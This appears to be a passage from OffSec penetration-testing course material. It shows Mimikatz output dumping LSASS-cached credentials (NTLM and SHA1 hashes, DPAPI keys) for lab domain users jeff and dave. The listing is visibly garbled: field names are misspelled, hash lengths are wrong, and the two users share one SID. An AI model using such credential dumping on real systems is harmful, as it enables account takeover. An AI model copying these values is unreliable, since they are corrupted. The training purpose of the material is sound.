# OffSec

Domain : CORP
Logon Server : DC1
Logon Time : 9/9/2022 12:32:11 PM
SID : S-1-5-21-1987370270-658905905-1781884369-1105

```
[0000003] Primary
* Username : jeff
* Domain : CORP
* NTLM : 2688cc6d2af5e9c7ddb268899123744ea
* SHAI : f57d987a25f39a287d158e8d5ac4bc8971352f
* DPAPT : 3a840721d5488a148c2625e6d27a420e6	spkg:
widget * Username : jeff
* Domain : CORP
* Password : (null)
kerberos * Username : jeff
* Domain : CORP.COM
* Password : (null)
ssp
credman
cloudap
Session : Service from 0
User Name : dave
Domain : CORP
Logon Server : DC1
Logon Time : 9/9/2022 1:32:23 AM
SID : S-1-5-21-1987370270-658905905-1781884369-1105
[0000003] Primary
* Username : dave
* Domain : CORP
* NTLM : 80d7a7a6f596bb67b1bae4178747494
* SHAI : a02f2885fad20cc0614e2d361d26597843557cd
* DPAPT : fed8536acs54dac3d9078bcc66dd1d17	spkg:
widget * Username : dave
* Domain : CORP
* Password : (null)
kerberos * Username : dave
* Domain : CORP.COM
* Password : (null)
ssp
credman
cloudap
```

| Listing 794 - Executing Mimikatz on a domain workstation |

The above shows all credential information stored in LSASS for the domain users jeff and dave, including cached hashes.